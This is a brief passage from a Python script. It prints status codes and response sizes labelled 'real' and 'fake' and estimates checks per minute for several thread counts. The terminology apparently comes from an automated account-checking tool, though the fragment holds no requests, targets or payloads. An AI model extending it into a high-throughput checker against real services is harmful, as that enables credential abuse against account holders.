        print(f"      real {w['rsc']}/{w['rln']}b  fake {w['fsc']}/{w['fln']}b")
        # CPM estimate: assume 300ms avg round trip, N threads
        avg_ms = 300
        for threads in [10, 30, 50, 100]:
            cpm = int(threads / (avg_ms/1000) * 60)
            print(f"      {threads} threads → ~{cpm} CPM")
print("DONE.")
